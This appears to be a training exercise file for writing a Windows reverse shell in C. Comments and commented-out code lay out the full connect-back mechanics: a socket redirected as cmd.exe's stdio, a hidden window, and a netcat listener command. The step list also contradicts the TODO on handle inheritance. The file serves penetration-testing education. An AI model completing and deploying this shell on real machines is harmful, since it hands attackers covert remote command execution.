// CFarer - Red Team Exercise 03
// TOPIC: Reverse Shell - Connect-back cmd.exe
// DIFFICULTY: Intermediate  PLATFORM: Windows
// PURPOSE: Authorized penetration testing education
//
// A reverse shell connects FROM the target TO the attacker's listener,
// then redirects cmd.exe stdin/stdout/stderr over the socket.
// Reverse shells bypass inbound firewall rules since the connection is outbound.
//
// Key mechanics:
//   - CreateProcess with STARTUPINFO.hStdInput/Output/Error = socket handle
//   - dwFlags = STARTF_USESTDHANDLES
//   - stdin/stdout both go over the socket
//
// Task:
//   1. WSAStartup + create TCP socket.
//   2. connect to LHOST:LPORT (default 127.0.0.1:4444).
//   3. Build STARTUPINFOA: set hStdInput = hStdOutput = hStdError = (HANDLE)sock.
//      Set dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW.
//      Set wShowWindow = SW_HIDE.
//   4. CreateProcessA(NULL, "cmd.exe", ..., FALSE, 0, NULL, NULL, &si, &pi).
//   5. WaitForSingleObject(pi.hProcess, INFINITE).
//   6. Close handles + WSACleanup.
//
// NOTE: Run a listener first: nc -lvnp 4444
//       If WSAECONNREFUSED (no listener): the exercise still validates the code path.

#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")

#define LHOST "127.0.0.1"
#define LPORT 4444

int main(void) {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    // TODO 1: create TCP socket
    SOCKET s = INVALID_SOCKET; // replace with socket(AF_INET, SOCK_STREAM, 0)

    struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons(LPORT);
    inet_pton(AF_INET, LHOST, &addr.sin_addr);

    // TODO 2: connect(s, ...)
    int conn = SOCKET_ERROR;
    if (conn != 0) {
        fprintf(stderr, "connect failed: %d (start a listener on %s:%d)\n",
                WSAGetLastError(), LHOST, LPORT);
        closesocket(s);
        WSACleanup();
        return 1;
    }

    STARTUPINFOA si = { .cb = sizeof(si) };
    PROCESS_INFORMATION pi = {0};

    // TODO 3: configure STARTUPINFO to use socket as stdio
    // si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    // si.wShowWindow = SW_HIDE;
    // si.hStdInput   = (HANDLE)s;
    // si.hStdOutput  = (HANDLE)s;
    // si.hStdError   = (HANDLE)s;

    // TODO 4: CreateProcessA(NULL, "cmd.exe", NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)
    //   Note: bInheritHandles = TRUE so child gets the socket handles
    BOOL ok = FALSE;
    if (!ok) {
        fprintf(stderr, "CreateProcess failed: %lu\n", GetLastError());
    } else {
        // TODO 5: WaitForSingleObject(pi.hProcess, INFINITE)
        CloseHandle(pi.hThread);
        CloseHandle(pi.hProcess);
    }

    closesocket(s);
    WSACleanup();
    return 0;
}

// I AM NOT DONE
